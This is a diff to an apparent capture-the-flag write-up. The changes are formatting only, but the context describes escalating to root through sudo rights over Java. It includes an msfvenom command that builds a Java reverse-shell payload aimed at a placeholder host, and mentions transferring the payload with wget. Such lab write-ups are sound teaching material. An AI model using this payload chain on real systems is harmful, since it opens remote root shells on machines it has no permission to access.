@@ -69,7 +69,7 @@ Now we can view the user flag..
 
 ![](/images/jar3.png)
 
-After doing `**sudo -l**` we found that we have root permissions to run any java file.
+After doing **sudo -l** we found that we have root permissions to run any java file.
 
 ![](/images/jar4.png)
 
@@ -77,6 +77,7 @@ So we created an exploit using msfvenom
 
 ```py
 msfvenom -p java/shell_reverse_tcp lhost=<local ip> lport=1234 -f jar -o pwn.jar
+
 ```
 Then i opened a http-server and transferred the payload to the shell using wget 
 
